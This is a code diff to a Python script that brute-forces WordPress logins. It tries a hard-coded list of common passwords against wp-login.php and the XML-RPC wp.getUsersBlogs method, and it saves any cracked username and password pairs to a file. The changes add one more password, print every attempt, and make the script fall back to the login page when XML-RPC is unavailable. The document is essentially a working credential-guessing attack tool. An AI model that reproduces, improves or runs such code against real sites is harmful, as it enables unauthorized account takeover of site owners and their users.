@@ -35,6 +35,7 @@ def brute_force_login(sites, username, cookies):
                 'testcookie': '1'}
 
                 r = requests.post(f'{sites}wp-login.php', headers=headers, timeout=10, data=data, verify=False, allow_redirects=False)
+                print(f'Status Code : {r.status_code} URL: {r.url} - Login INFO : {username}::{passwords}')
                 if f'{username}%' in r.headers['Set-Cookie']:
                     print(f'[Log in Success] >> {sites} - {username}::{passwords}')
                     with open('wp_crack_login_page.txt', 'a+') as output:
@@ -54,7 +55,7 @@ def brute_force_xmlrpc(sites, username, cookies):
         'Cookie': f'humans_21909=1; {cookies}'}
 
     try:
-        passwd = ['admin', 'pass', 'admin123', 'admin@123', 'admin1234', 'admin123456', 'admin@1234', '123456', 'password', 'passw0rd', '111111', 'password1', 'qwerty', 'qwerty1234', 'qwerty123456', 'qwertyuiop', 'Admin', 'Admin@1234']
+        passwd = ['admin', 'pass', 'admin123', 'admin@123', 'admin1234', 'admin123456', 'admin@1234', '123456', 'password', 'passw0rd', '111111', 'password1', 'Fucker123!!Dragon123~!', 'qwerty', 'qwerty1234', 'qwerty123456', 'qwertyuiop', 'Admin', 'Admin@1234']
         for z in passwd:
             pass1 = []
             pass1.append(z)
@@ -64,6 +65,7 @@ def brute_force_xmlrpc(sites, username, cookies):
 
                 data = """<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>%s</value></param><param><value>%s</value></param></params></methodCall>""" % (username, passwords)
                 r = requests.post(f'{sites}xmlrpc.php', headers=headers, data=data, timeout=10, verify=False)
+                print(f'Status Code : {r.status_code} URL: {r.url} - Login INFO : {username}::{passwords}')
                 if r.ok:
                     if 'isAdmin' in r.text:
                         print(f'[Log in success] >> {sites} - {username}::{passwords}')
@@ -84,7 +86,7 @@ def check_xmlrpc(sites, username, cookies):
             if 'Hello!' in r.text:
                 brute_force_xmlrpc(sites, username, cookies)
             else:
-                pass
+                brute_force_login(sites, username, cookies)
         else:
             brute_force_login(sites, username, cookies)
     except:
